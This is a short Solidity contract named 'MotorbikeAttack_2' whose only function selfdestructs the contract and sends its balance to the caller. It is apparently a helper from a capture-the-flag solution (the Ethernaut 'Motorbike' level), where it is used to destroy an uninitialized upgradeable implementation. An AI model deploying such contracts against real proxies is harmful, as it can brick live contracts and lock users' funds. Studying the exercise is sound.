// SPDX-License-Identifier: MIT

pragma solidity <0.7.0;

contract MotorbikeAttack_2 {
    function destruct() external {
        selfdestruct(msg.sender);
    }
}
